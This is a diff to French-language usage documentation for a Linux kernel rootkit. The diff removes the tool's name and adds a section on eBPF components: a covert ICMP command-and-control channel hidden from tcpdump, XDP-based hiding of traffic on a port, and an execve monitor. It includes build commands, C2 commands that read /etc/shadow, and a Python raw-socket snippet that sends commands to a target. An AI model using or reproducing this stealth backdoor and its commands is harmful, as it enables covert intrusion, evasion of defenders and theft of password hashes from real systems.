@@ -1,4 +1,4 @@
-# SHADYX — Documentation d'utilisation
+# Documentation d'utilisation
 
 ## Architecture
 
@@ -237,7 +237,62 @@ Le companion `rootkit_malware` contrôle le module depuis la cible :
 
 ---
 
-## 6. Metamorph seul
+## 6. eBPF
+
+Trois programmes eBPF indépendants du module kernel.
+
+### Prérequis
+
+```bash
+sudo apt install clang libbpf-dev
+make ebpf   # compile les 3 programmes + le loader
+```
+
+### 6.1 Canal C2 covert ICMP (`icmp_c2.bpf.c`)
+
+Intercepte les paquets ICMP Echo Request contenant le magic `0xDEAD1337`. La commande embarquée dans le payload est exécutée sur la cible. Le paquet est droppé — invisible au stack réseau et à tcpdump.
+
+**Via le C2 (recommandé) :**
+```
+[c2] > set TARGET 192.168.1.100
+[c2] > exec id > /tmp/.rk_out
+[c2] > exec cat /etc/shadow >> /tmp/.rk_out
+```
+
+**Manuellement (raw socket) :**
+```python
+import struct, socket
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+magic = struct.pack('!I', 0xDEAD1337)
+cmd   = b'id > /tmp/.rk_out'
+icmp  = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + magic + cmd
+s.sendto(icmp, ('<IP_cible>', 0))
+```
+
+### 6.2 Masquage réseau XDP (`xdp_hide.bpf.c`)
+
+Cache les paquets sur un port au niveau driver — avant même que le kernel IP stack les voie. Tcpdump ne les voit pas.
+
+```bash
+sudo ./ebpf/rk_ebpf_loader xdp_attach eth0
+sudo ./ebpf/rk_ebpf_loader xdp_hide_port 9999
+sudo ./ebpf/rk_ebpf_loader xdp_enable
+
+# Retirer
+sudo ./ebpf/rk_ebpf_loader xdp_detach eth0
+```
+
+### 6.3 Monitoring execve (`exec_monitor.bpf.c`)
+
+Monitore tous les `execve` sur la machine en temps réel. Utile pour observer l'activité post-exploitation ou détecter des contre-mesures.
+
+```bash
+sudo ./ebpf/rk_ebpf_loader exec_monitor
+```
+
+---
+
+## 8. Metamorph seul
 
 ```bash
 # Sur un binaire userspace
@@ -259,7 +314,7 @@ Transforms appliquées :
 
 ---
 
-## 7. Pourquoi ces choix
+## 9. Pourquoi ces choix
 
 ### Obfuscation des strings (obfs.h / obfs.c)
 
